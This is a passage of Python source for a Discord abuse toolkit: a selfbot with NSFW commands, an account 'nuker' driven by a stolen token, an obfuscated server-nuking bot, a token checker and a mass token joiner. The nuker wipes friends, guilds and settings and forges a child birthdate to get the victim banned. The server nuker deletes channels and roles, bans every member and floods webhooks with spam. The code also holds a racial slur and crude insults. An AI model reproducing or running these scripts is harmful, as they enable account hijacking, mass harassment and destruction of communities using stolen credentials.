  async def lewdneko(ctx):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_neko.gif"))
      except:
          em = discord.Embed()
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def lesbian(ctx):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/les")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_lesbian.gif"))
      except:
          em = discord.Embed()
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def cumslut(ctx):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/cum")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_cumslut.gif"))
      except:
          em = discord.Embed()
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command(aliases=["vagina"])
  async def pussy(ctx):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/pussy")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_pussy.gif"))
      except:
          em = discord.Embed()
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def waifu(ctx):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/waifu")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_waifu.gif"))
      except:
          em = discord.Embed()
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def feed(ctx, user: discord.Member):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/feed")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(user.mention, file=discord.File(file, f"exeter_feed.gif"))
      except:
          em = discord.Embed(description=user.mention)
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def tickle(ctx, user: discord.Member):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/tickle")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(user.mention, file=discord.File(file, f"exeter_tickle.gif"))
      except:
          em = discord.Embed(description=user.mention)
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def slap(ctx, user: discord.Member):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/slap")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(user.mention, file=discord.File(file, f"exeter_slap.gif"))
      except:
          em = discord.Embed(description=user.mention)
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def hug(ctx, user: discord.Member):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/hug")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(user.mention, file=discord.File(file, f"exeter_hug.gif"))
      except:
          em = discord.Embed(description=user.mention)
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def cuddle(ctx, user: discord.Member):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/cuddle")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(user.mention, file=discord.File(file, f"exeter_cuddle.gif"))
      except:
          em = discord.Embed(description=user.mention)
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def smug(ctx, user: discord.Member):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/smug")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(user.mention, file=discord.File(file, f"exeter_smug.gif"))
      except:
          em = discord.Embed(description=user.mention)
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def pat(ctx, user: discord.Member):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/pat")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(user.mention, file=discord.File(file, f"exeter_pat.gif"))
      except:
          em = discord.Embed(description=user.mention)
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def kiss(ctx, user: discord.Member):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/kiss")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(user.mention, file=discord.File(file, f"exeter_kiss.gif"))
      except:
          em = discord.Embed(description=user.mention)
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def uptime(ctx):
      await ctx.message.delete()
      now = datetime.datetime.utcnow()  # Timestamp of when uptime function is run
      delta = now - start_time
      hours, remainder = divmod(int(delta.total_seconds()), 3600)
      minutes, seconds = divmod(remainder, 60)
      days, hours = divmod(hours, 24)
      if days:
          time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
      else:
          time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
      uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
      await ctx.send(uptime_stamp)


  @Arsky.command()
  async def purge(ctx, amount: int):
      await ctx.message.delete()
      async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Arsky.user).map(
              lambda m: m):
          try:
              await message.delete()
          except:
              pass


  @Arsky.command(name='group-leaver',
                  aliase=['leaveallgroups', 'leavegroup', 'leavegroups', "groupleave", "groupleaver"])
  async def _group_leaver(ctx):
      await ctx.message.delete()
      for channel in Arsky.private_channels:
          if isinstance(channel, discord.GroupChannel):
              await channel.leave()


  @Arsky.command(aliases=["streaming"])
  async def stream(ctx, *, message):
      await ctx.message.delete()
      stream = discord.Streaming(
          name=message,
          url=stream_url,
      )
      await Arsky.change_presence(activity=stream)


  @Arsky.command(alises=["game"])
  async def playing(ctx, *, message):
      await ctx.message.delete()
      game = discord.Game(
          name=message
      )
      await Arsky.change_presence(activity=game)


  @Arsky.command(aliases=["listen"])
  async def listening(ctx, *, message):
      await ctx.message.delete()
      await Arsky.change_presence(
          activity=discord.Activity(
              type=discord.ActivityType.listening,
              name=message,
          ))


  @Arsky.command(aliases=["watch"])
  async def watching(ctx, *, message):
      await ctx.message.delete()
      await Arsky.change_presence(
          activity=discord.Activity(
              type=discord.ActivityType.watching,
              name=message
          ))


  @Arsky.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
  async def stopactivity(ctx):
      await ctx.message.delete()
      await Arsky.change_presence(activity=None, status=discord.Status.dnd)


  @Arsky.command()
  async def reverse(ctx, *, message):
      await ctx.message.delete()
      message = message[::-1]
      await ctx.send(message)


  @Arsky.command()
  async def shrug(ctx):
      await ctx.message.delete()
      shrug = r'¯\_(ツ)_/¯'
      await ctx.send(shrug)


  @Arsky.command()
  async def lenny(ctx):
      await ctx.message.delete()
      lenny = '( ͡° ͜ʖ ͡°)'
      await ctx.send(lenny)


  @Arsky.command(aliases=["fliptable"])
  async def tableflip(ctx):
      await ctx.message.delete()
      tableflip = '(╯°□°）╯︵ ┻━┻'
      await ctx.send(tableflip)


  @Arsky.command()
  async def unflip(ctx):
      await ctx.message.delete()
      unflip = '┬─┬ ノ( ゜-゜ノ)'
      await ctx.send(unflip)


  @Arsky.command()
  async def bold(ctx, *, message):
      await ctx.message.delete()
      await ctx.send('**' + message + '**')


  @Arsky.command()
  async def censor(ctx, *, message):
      await ctx.message.delete()
      await ctx.send('||' + message + '||')


  @Arsky.command()
  async def underline(ctx, *, message):
      await ctx.message.delete()
      await ctx.send('__' + message + '__')


  @Arsky.command()
  async def italicize(ctx, *, message):
      await ctx.message.delete()
      await ctx.send('*' + message + '*')


  @Arsky.command()
  async def strike(ctx, *, message):
      await ctx.message.delete()
      await ctx.send('~~' + message + '~~')


  @Arsky.command()
  async def quote(ctx, *, message):
      await ctx.message.delete()
      await ctx.send('> ' + message)


  @Arsky.command()
  async def code(ctx, *, message):
      await ctx.message.delete()
      await ctx.send('`' + message + "`")


  @Arsky.command(name='rolecolor')
  async def _role_hexcode(ctx, *, role: discord.Role):
      await ctx.message.delete()
      await ctx.send(f"{role.name} : {role.color}")

  @Arsky.event
  async def on_connect():
      print("uwu")
  @Arsky.command()
  async def empty(ctx):
      await ctx.message.delete()
      await ctx.send(chr(173))


  @Arsky.command()
  async def everyone(ctx):
      await ctx.message.delete()
      await ctx.send('https://@everyone@google.com')


  @Arsky.command(aliases=["logout"])
  async def shutdown(ctx):
      await ctx.message.delete()
      await Arsky.logout()


  @Arsky.command(aliases=["nitrogen"])
  async def nitro(ctx):
      await ctx.message.delete()
      await ctx.send(Nitro())


  if __name__ == '__main__':
      Init()



def accnukerz():
  import requests
  import string
  import random
  import time
  import multiprocessing
  import sys
  import os
  from colorama import Fore




  t_or_f = [True, False]

  none = ""


  Test_Token = input("Enter A Token: ")
  if Test_Token == "":
      print("Bruh put a fucking token")
      print("Going back to menu cause ur ass cant even start a damn token cuh")
      time.sleep(2)
      os.system('python main.py')


  def generate_random_string(Ammount):
      string_returned = "".join(
          random.choice(string.ascii_letters) for i in range(0, Ammount)
      )
      return string_returned


  def get_all_friends(Token):
      headers = {"authorization": Token, "user-agent": "bruh6/9"}
      r = requests.get(
          "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
      )
      for friend in r.json():
          print(f"{friend['user']['username']}#{friend['user']['discriminator']}")
          print(f"{'-'*10}")
      time.sleep(3)


  def get_token_information(Token):
      headers = {"authorization": Token, "user-agent": "bruh6/9"}
      token_info_request = requests.get(
          "https://canary.discord.com/api/v9/users/@me", headers=headers
      ).json()
      for key in token_info_request:
          print(f"{Fore.WHITE}{key}: {Fore.RED}{token_info_request[f'{key}']}")
      time.sleep(3)


  def spam_token_servers(Token):
      headers = {"authorization": Token, "user-agent": "bruh6/9"}
      for count, i in enumerate(range(0, 25)):
          payload = {"name": generate_random_string(15)}
          spam_server_request = requests.post(
              "https://canary.discord.com/api/v8/guilds", headers=headers, json=payload
          )


  def remove_all_token_friends(Token):
      headers = {"authorization": Token, "user-agent": "bruh6/9"}
      remove_friends_request = requests.get(
          "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
      ).json()
      for i in remove_friends_request:
          requests.delete(
              f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
              headers=headers,
          )
          print(f"Removed Friend {i['id']}")


  def block_all_token_friends(Token):
      headers = {"authorization": Token, "user-agent": "bruh6/9"}
      json = {"type": 2}
      block_friends_request = requests.get(
          "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
      ).json()
      for i in block_friends_request:
          requests.put(
              f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
              headers=headers,
              json=json,
          )
          print(f"Blocked Friend {i['id']}")


  def spam_token_settings(Token):
    print('Started Job')
    for i in range(0, 100):
      headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
      condition_status = True
      payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko", "message_display_compact": condition_status, "explicit_content_filter": 2, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 1, "enable_tts_command": condition_status,  "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "idle", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
      requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
      condition_status = False
      payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg", "message_display_compact": condition_status, "explicit_content_filter": 0, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 2, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
      requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)


  def leave_all_servers(Token):
      headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
      leave_all_servers_request = requests.get(
          "https://canary.discord.com/api/v8/users/@me/guilds", headers=headers
      ).json()
      for guild in leave_all_servers_request:
          requests.delete(
              f"https://canary.discord.com/api/v8/users/@me/guilds/{guild['id']}",
              headers=headers,
          )
          print(f"Left Guild: {guild['id']}")


  def close_all_dms(Token):
      headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
      close_dm_request = requests.get(
          "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
      ).json()
      for channel in close_dm_request:
          requests.delete(
              f"https://canary.discord.com/api/v8/channels/{channel['id']}",
              headers=headers,
          )


  def cycle_token_status(Token):
      headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
      for i in range(0, 50):
          json = {"custom_status": {"text": "You Got Nuked By Ditto", "emoji_name": "🍉"}}
          requests.patch(
              "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
          )
          time.sleep(0.7)
          json = {"custom_status": {"text": "dittotools.xyz", "emoji_name": "🥵"}}
          requests.patch(
              "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
          )
          time.sleep(0.7)
          json = {"custom_status": {"text": "Get Good, Get Ditto", "emoji_name": "😈"}}
          requests.patch(
              "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
          )
          time.sleep(0.7)


  def send_mass_dm(Token):
      headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
      mass_dm_request = requests.get(
          "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
      ).json()
      for channel in mass_dm_request:
          json = {"content": generate_random_string(20)}
          time.sleep(1)
          r = requests.post(
              f"https://canary.discord.com/api/v8/channels/{channel['id']}/messages",
              headers=headers,
              data=json,
          )
          print(f"Sent DM To {channel['id']}")


  def mark_servers_as_read(Token):
      headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
      mark_guild_request = requests.get(
          "https://discord.com/api/v8/users/@me/guilds", headers=headers
      ).json()
      for channel in mark_guild_request:
          r = requests.post(
              f"https://discord.com/api/v8/guilds/{channel['id']}/ack", headers=headers
          )
          print(channel["id"])


  def remove_token_email(Token):
      headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
      requests.get(
          "https://canary.discordapp.com/api/v8/guilds/0/members", headers=headers
      )


  def delete_discord_webhook(Webhook):
      requests.delete(Webhook)


  def get_token_country(Token):
      headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
      token_country_request = requests.get(
          "https://discord.com/api/v8/auth/location-metadata", headers=headers
      ).json()
      print(f"Token Country: {token_country_request['country_code']}")


  def resend_verification_email(Token):
      headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
      requests.post("https://discord.com/api/v8/auth/verify/resend", headers=headers)


  def spam_token_email(Token):
      for i in range(0, 20):
          remove_token_email(Token)
          time.sleep(2)
          resend_verification_email(Token)


  def ban_token(Token):
      headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
      for i in range(0, 1):
          payload = {"username": "Bruh", "discriminator": 9871}
          requests.patch(
              "https://discordapp.com/api/v6/users/@me",
              headers=headers,
              json={"date_of_birth": "2017-2-11"},
          )


  def delete_personal_guilds(Token):
      headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
      print("Got Data")
      delete_personal_request = requests.get(
          "https://discord.com/api/v9/users/@me/guilds", headers=headers
      ).json()
      for i in delete_personal_request:
          requests.post(
              f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
              headers=headers,
          )
          print(i["id"])


  sad = {
      "0": get_all_friends,
      "1": get_token_information,
      "2": spam_token_servers,
      "3": remove_all_token_friends,
      "4": block_all_token_friends,
      "5": spam_token_settings,
      "6": leave_all_servers,
      "7": close_all_dms,
      "8": cycle_token_status,
      "9": send_mass_dm,
      "10": mark_servers_as_read,
      "11": remove_token_email,
      "12": delete_discord_webhook,
      "13": get_token_country,
      "14": resend_verification_email,
      "15": spam_token_email,
      "16": ban_token,
      "17": delete_personal_guilds,
  }


  def main():
      for count, i in enumerate(sad):
          separate_options = str(sad[i]).split("<function ")
          print(
              f"{Fore.WHITE}[{Fore.RED}{count}{Fore.WHITE}]",
              f"{Fore.RED}{str(separate_options[1]).split(' at ')[0].replace('_', ' ').upper()}",
          )
      choose_nuke = input("Please Enter An Option From The List: ")
      if choose_nuke == 5 or choose_nuke == "5":
          jobs = []
          for i in range(0, 6):
              process = multiprocessing.Process(
                  target=spam_token_settings, args=(Test_Token,)
              )

              jobs.append(process)

          for j in jobs:
              j.start()

          for j in jobs:
              j.join()

      elif choose_nuke == 2 or choose_nuke == "2":
          jobs = []
          for i in range(0, 4):
              process = multiprocessing.Process(
                  target=spam_token_servers, args=(Test_Token,)
              )

              jobs.append(process)

          for j in jobs:
              j.start()

          for j in jobs:
              j.join()

      else:
          sad[choose_nuke](Test_Token)


  if __name__ == "__main__":
      while 1:
          try:
              main()
          except KeyboardInterrupt:
              sys.exit()




def niggiz():
  from discord .ext import commands #line:5
  from colorama import Fore #line:6
  from colorama import Fore as Color #line:7
  from discord import Webhook ,AsyncWebhookAdapter #line:8
  import aiohttp #line:9
  import random #line:10
  import sys #line:12
  import os #line:13

  spamname1 ="sex"#line:17
  spam_messages =input ("Messages to be spammed >")
  webhook_usernames =input ("Usernames >")
  avatar =["https://img.webmd.com/dtmcms/live/webmd/consumer_assets/site_images/article_thumbnails/other/cat_relaxing_on_patio_other/1800x1200_cat_relaxing_on_patio_other.jpg","https://nenow.in/wp-content/uploads/2020/04/cat-image-2.jpg","https://upload.wikimedia.org/wikipedia/en/e/ed/Nyan_cat_250px_frame.PNG"]#line:20
  Eagle =commands .Bot (command_prefix ='.')#line:23
  Eagle .remove_command ('help')#line:24
  def restart_program ():#line:26
      OO00O0000O00OOOO0 =sys .executable #line:27
      os .execl (OO00O0000O00OOOO0 ,OO00O0000O00OOOO0 ,*sys .argv )#line:28
  @Eagle .event #line:32
  async def on_ready ():#line:33
    print (f''' /\     |\**/|  {Fore.CYAN}    
  /  \    \ == /{Fore.CYAN}
  |  |     |  |{Fore.CYAN}
  |  |     |  |{Fore.CYAN}
  / == \    \  /{Fore.CYAN}
  |/**\|     \/{Fore.CYAN}


  ░█▀▀▀ █▀▀█ █▀▀▀ █── █▀▀ 　 ░█▄─░█ █──█ █─█ █▀1▀ █▀▀█ {Fore.CYAN}
  ░█▀▀▀ █▄▄█ █─▀█ █── █▀▀ 　 ░█░█░█ █──█ █▀▄ █▀▀ █▄▄▀ {Fore.CYAN}
  ░█▄▄▄ ▀──▀ ▀▀▀▀ ▀▀▀ ▀▀▀ 　 ░█──▀█ ─▀▀▀ ▀─▀ ▀▀▀ ▀─▀▀{Fore.CYAN}
              |___/  
  {Fore.RED}
  by stoned.eagle#0001  
  Connected to (Eagle.user.name)
  Amogus activated ඞඞඞඞඞඞ
  {Fore.LIGHTCYAN_EX}
  ''' 'Logged into'.format (Eagle .user .name ))#line:52
    print (f"""

  """)#line:56
  @Eagle .command ()#line:64
  async def droles (OOOO000O0O0OOO0OO ):#line:65
      await OOOO000O0O0OOO0OO .message .delete ()#line:66
      O0OO000O0OOOO0000 =list #line:67
      for O0OO0O0O000O00OOO in O0OO000O0OOOO0000 (OOOO000O0O0OOO0OO .guild .roles ):#line:68
          try :#line:69
              await O0OO0O0O000O00OOO .delete ()#line:70
              print (f'Succesfully Deleted {Fore.LIGHTCYAN_EX}{O0OO0O0O000O00OOO.name} kekw')#line:71
          except :#line:72
              print (f'Failed to delete{Fore.LIGHTRED_EX} {O0OO0O0O000O00OOO.name} :(')#line:73
  def RandomColor ():#line:75
      O00OOO000OO00OO0O =discord .Color (random .randint (0x000000 ,0xFFFFFF ))#line:76
      return O00OOO000OO00OO0O #line:77
  @Eagle .command ()#line:79
  async def n (OOOO00O000OOO0000 ):#line:80
      O00OO000OOOO00OO0 =OOOO00O000OOO0000 .guild #line:81
      for O0OOO00O0O00OOOO0 in O00OO000OOOO00OO0 .channels :#line:82
          try :#line:83
              await O0OOO00O0O00OOOO0 .delete ()#line:84
              print (f"{Fore.WHITE}{O0OOO00O0O00OOOO0.name} {Color.GREEN}was deleted in {Color.WHITE}{O00OO000OOOO00OO0.name}")#line:85
          except :#line:86
              print (f"{Color.WHITE}{O0OOO00O0O00OOOO0.name} {Color.RED}was not deleted in {Color.WHITE}{O00OO000OOOO00OO0.name}")#line:87
          await O00OO000OOOO00OO0 .create_text_channel ("stoned.eagle runs u")#line:88
          await O00OO000OOOO00OO0 .create_text_channel ("stoned.eagle runs u")#line:89
          await O00OO000OOOO00OO0 .create_text_channel ("stoned.eagle runs u")#line:90
          await O00OO000OOOO00OO0 .create_text_channel ("stoned.eagle runs u")#line:91
          await O00OO000OOOO00OO0 .create_text_channel ("stoned.eagle runs u")#line:92
          await O00OO000OOOO00OO0 .create_text_channel ("stoned.eagle runs u")#line:93
          await O00OO000OOOO00OO0 .create_text_channel ("stoned.eagle runs u")#line:94
          await O00OO000OOOO00OO0 .create_text_channel ("stoned.eagle runs u")#line:95
          await O00OO000OOOO00OO0 .create_text_channel ("stoned.eagle runs u")#line:96
          await O00OO000OOOO00OO0 .create_text_channel ("stoned.eagle runs u")#line:97
          await O00OO000OOOO00OO0 .create_text_channel ("stoned.eagle runs u")#line:98
  import discord #line:102
  @Eagle .command ()#line:104
  async def help (OOO0O0000OOO0OOOO ):#line:105
          OO000O0O0O00000OO =discord .Embed (color =0x7009E9 ,timestamp =OOO0O0000OOO0OOOO .message .created_at )#line:106
          OO000O0O0O00000OO .set_image (url ="")#line:107
          OO000O0O0O00000OO .description =f" `Eagle NukeBot`\n - ``n`` - Total Nuke\n - ``sr`` - spam rename server\n - ``droles`` - Deletes Roles\n - ``sroles`` - Stops status\n - ``restart`` - Restart the nuke bot"#line:108
          await OOO0O0000OOO0OOOO .send (embed =OO000O0O0O00000OO )#line:109
  @Eagle .command (aliases =["spamroles"])#line:113
  async def sroles (OO0OOOO000000O0OO ):#line:114
      await OO0OOOO000000O0OO .message .delete ()#line:115
      OO0O000O0000O0O0O =OO0OOOO000000O0OO .guild .roles #line:116
      try :#line:118
       for _O00OO0000OO000OO0 in range (250 ):#line:119
          await OO0OOOO000000O0OO .guild .create_role (name ="Eagle",color =RandomColor ())#line:120
          print (f"{Color.WHITE}{OO0O000O0000O0O0O.name} {Color.RED}has been made lol{Color.WHITE}")#line:121
      except :#line:123
          print (f"{Color.WHITE}{OO0O000O0000O0O0O.name} {Color.RED}was not deleted ")#line:124
  @Eagle .command ()#line:126
  async def banall (O000O000000OO0000 ):#line:127
    for OO0OOOO0OO0O0OO0O in list (O000O000000OO0000 .guild .members ):#line:128
      await OO0OOOO0OO0O0OO0O .ban ()#line:129
  @Eagle .command ()#line:132
  async def restart (OO0OO00OOO0000O0O ):#line:133
      await OO0OO00OOO0000O0O .message .delete ()#line:134
      OOO00OO0OOO000OOO =await OO0OO00OOO0000O0O .send ("Restarting... Allow up to 5 seconds")#line:135
      restart_program ()#line:136
  @Eagle .command ()#line:138
  async def nig (O00000O0O0000O0OO ):#line:139
      O00OOO00OO0OOOO0O =range #line:140
      for O00OOOO0O0000O0O0 in O00OOO00OO0OOOO0O (69 ):#line:141
          await O00000O0O0000O0OO .send (f'dick balls {O00OOO00OO0OOOO0O}')#line:142
  @Eagle .command ()#line:145
  async def sr (O00OOO0O000O0O0O0 ):#line:146
      for OO0O0000000O0O000 in range (250 ):#line:147
        O0OOO00O0O0OOOOO0 =O00OOO0O000O0O0O0 .guild #line:148
      await O0OOO00O0O0OOOOO0 .edit (name =spamname1 )#line:149
      await O0OOO00O0O0OOOOO0 .edit (name ="beamed by eagle")#line:150
      await O0OOO00O0O0OOOOO0 .edit (name ="egirls")#line:151
      await O0OOO00O0O0OOOOO0 .edit (name ="42 on top")#line:152
  @Eagle .event #line:157
  async def on_guild_channel_create (OOOO0000OOOOO0OOO ):#line:158
    OOOO0OO0OO00O0000 =await OOOO0000OOOOO0OOO .create_webhook (name ="nuked")#line:159
    O000OOO00OOO00O0O =OOOO0OO0OO00O0000 .url #line:160
    async with aiohttp .ClientSession ()as O00O00O0OOOO0O0O0 :#line:161
      OOOO0OO0OO00O0000 =Webhook .from_url (str (O000OOO00OOO00O0O ),adapter =AsyncWebhookAdapter (O00O00O0OOOO0O0O0 ))#line:162
      while True :#line:163
        await OOOO0OO0OO00O0000 .send ((spam_messages ),username =(webhook_usernames ),avatar_url =random .choice (avatar ))#line:164
  @Eagle .command ()#line:167
  async def ball (O000OOO0O0O00OOOO ):#line:168
      for O00O0OO00000O00OO in O000OOO0O0O00OOOO .guild .members :#line:169
          await O000OOO0O0O00OOOO .member .ban (reason ="fucked by eagle and kojimu is gay ")#line:170
          print (f"Banned {O00O0OO00000O00OO.display_name} lol")#line:171
      print ("Banning complete!")#line:172
  TOKEN =input("Bots token >")#line:176
  Eagle .run (TOKEN )#line:177


from requests import get, post
from random import randint

def tokenchecker():

    def variant1(token):
        response = get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})#Bad variant for mass token check due to the rate limit.
        return True if response.status_code == 200 else False

    def variant2(token):
        response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
        if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
            return False
        else:
            return True

    def variant2_Status(token):
        response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
        if response.status_code == 401:
            return 'Invalid'
        elif "You need to verify your account in order to perform this action." in str(response.content):
            return 'Phone Lock'
        else:
            return 'Valid'

    if __name__ == "__main__":
        try:
            checked = []
            with open('tokens.txt', 'r') as tokens:
                for token in tokens.read().split('\n'):
                    if len(token) > 15 and token not in checked and variant2(token) == True:
                        print(f'Token: {token} is Valid')
                        checked.append(token)
                    else:
                        print(f'Token: {token} is Invalid')
            if len(checked) > 0:
                save = input(f'{len(checked)} valid tokens\nSave to File (y/n)').lower()
                if save == 'y':
                    name = randint(100000000, 9999999999)
                    with open(f'{name}.txt', 'w') as saveFile:
                        saveFile.write('\n'.join(checked))
                    print(f'Tokens Save To {name}.txt File!')
            input('Press Enter For Exit...')
        except:
            input('Can`t Open "tokens.txt" File!')

import asyncio

def leaver(self):
        try:
            self.rpc.update(state="Server Leaver Screen", details="", large_image="default")
        except:
            pass
        self.sendText('screen2')
        print('\n                                       ' + Fore.BLUE + '[' +
              Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
              'Please provide guild id: ',
              end='')
        guildId = input()
        if guildId == '0':
            self.start()
        try:
            self.rpc.update(state="Using Server Leaver", details="", large_image="default")
        except:
            pass
        for token in self.tokens:
                (self.leaveServer(token, guildId))
                asyncio.sleep(5)
                self.start()






def tokenjoiner():
    link = input('Discord Invite Link: ')
    if len(link) > 6:
        link = link[19:]
    apilink = "https://discordapp.com/api/v6/invite/" + str(link)

    print (link)
    try:
        with open('tokens.txt','r') as handle:
                tokens = handle.readlines()
                for x in tokens:
                    token = x.rstrip()
                    headers={
                        'Authorization': token
                        }
                    requests.post(apilink, headers=headers)
                print ("All valid tokens have joined!")
    except Exception as e: print(e)


print("""




""")







class AlreadyPut():
    None


class appdata():
    pass






def tokenmanagement():
    from aiohttp.client import ClientSession
    import sys, os, asyncio, shutil, colorama, encodings.idna, time, random
    from colorama import Fore
    import pymongo
    from pymongo.errors import OperationFailure
    from pypresence.presence import AioPresence
    from tasksio import TaskPool
    from aiohttp import client_exceptions
    from sys import exit

    if sys.platform == 'win32':
        loop = asyncio.ProactorEventLoop()
        asyncio.set_event_loop(loop)

    colorama.init(convert=True)

    clear = lambda: os.system("cls")
    if sys.platform == "linux":
        clear = lambda: os.system("clear")

    class OWL():
        def __init__(self, rpc: AioPresence):
            self.tokens = []
            self.rpc = rpc

            # Checker
            self.checking = False
            self.checked = []
            self.totalChecked = []
            # Checker

            # Proxy Support
            self.proxies = []
            self.proxyless = True
            # Proxy Support

